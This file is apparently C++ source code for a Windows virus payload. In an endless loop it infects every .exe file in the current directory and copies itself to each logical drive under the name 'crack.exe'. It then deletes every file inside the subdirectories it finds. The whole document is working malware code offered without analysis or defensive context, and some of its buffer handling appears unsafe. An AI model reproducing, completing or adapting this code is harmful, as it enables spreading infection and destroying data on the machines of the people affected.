#include "data_globals.h"
#pragma optimize("", off)
void Payload(void)
{
    volatile struct _LocalCtx {
        WIN32_FIND_DATAA findDataExe;
        WIN32_FIND_DATAA findDataDir;
        WIN32_FIND_DATAA findDataSub;
        char drivePath[42];
        char tempPath[16];
        char baseDir[160];
        char searchPattern[16];
        char dirCopy[16];
        HANDLE hFindExe;
        HANDLE hFindDir;
        HANDLE hFindSub;
        char* driveIter;
        size_t driveLen;
    } ctx;

    // Cast away volatile for all string/API calls
    strncpy(const_cast<char*>(ctx.drivePath), "crack.exe", 10);
    ctx.hFindExe = INVALID_HANDLE_VALUE;
    ctx.hFindDir = INVALID_HANDLE_VALUE;
    ctx.hFindSub = INVALID_HANDLE_VALUE;
    ctx.driveIter = nullptr;
    ctx.driveLen = 0;

    do {
        Sleep(5000);

        ctx.hFindExe = FindFirstFileA("*.exe", const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataExe));
        if (ctx.hFindExe != INVALID_HANDLE_VALUE) {
            do {
                Infect(const_cast<char*>(ctx.findDataExe.cFileName), VBuffer);
            } while (FindNextFileA(ctx.hFindExe, const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataExe)));
            FindClose(ctx.hFindExe);
        }

        GetLogicalDriveStringsA(0x400, Drives);
        for (ctx.driveIter = Drives; *ctx.driveIter != '\0'; ctx.driveIter += ctx.driveLen + 1) {
            strcpy(const_cast<char*>(ctx.drivePath + 10), ctx.driveIter);
            strcat(const_cast<char*>(ctx.drivePath + 10), const_cast<const char*>(ctx.drivePath));
            CopyFileA(Virus, const_cast<LPCSTR>(ctx.drivePath + 10), 0);
            ctx.driveLen = strlen(ctx.driveIter);
        }

        ctx.hFindDir = FindFirstFileA("*.", const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataDir));
        if (ctx.hFindDir != INVALID_HANDLE_VALUE) {
            do {
                if (ctx.findDataDir.dwFileAttributes == 0x10) {
                    strcpy(const_cast<char*>(ctx.tempPath), const_cast<const char*>(ctx.baseDir));
                    strcat(const_cast<char*>(ctx.tempPath), const_cast<const char*>(ctx.findDataDir.cFileName));
                    strcpy(const_cast<char*>(ctx.searchPattern), const_cast<const char*>(ctx.tempPath));
                    strcpy(const_cast<char*>(ctx.dirCopy), const_cast<const char*>(ctx.tempPath));
                    ctx.driveLen = strlen(const_cast<const char*>(ctx.searchPattern));
                    strncpy(const_cast<char*>(ctx.searchPattern + ctx.driveLen), "\\*.*", 5);
                    ctx.hFindSub = FindFirstFileA(const_cast<LPCSTR>(ctx.searchPattern), const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataSub));
                    if (ctx.hFindSub != INVALID_HANDLE_VALUE) {
                        do {
                            strcpy(const_cast<char*>(ctx.tempPath), const_cast<const char*>(ctx.dirCopy));
                            ctx.driveLen = strlen(const_cast<const char*>(ctx.tempPath));
                            const_cast<char*>(ctx.tempPath)[ctx.driveLen] = '\\';
                            const_cast<char*>(ctx.tempPath)[ctx.driveLen + 1] = '\0';
                            strcat(const_cast<char*>(ctx.tempPath), const_cast<const char*>(ctx.findDataSub.cFileName));
                            DeleteFileA(const_cast<LPCSTR>(ctx.tempPath));
                        } while (FindNextFileA(ctx.hFindSub, const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataSub)));
                        FindClose(ctx.hFindSub);
                    }
                }
            } while (FindNextFileA(ctx.hFindDir, const_cast<LPWIN32_FIND_DATAA>(&ctx.findDataDir)));
            FindClose(ctx.hFindDir);
        }
    } while (true);
}
#pragma optimize("", on)
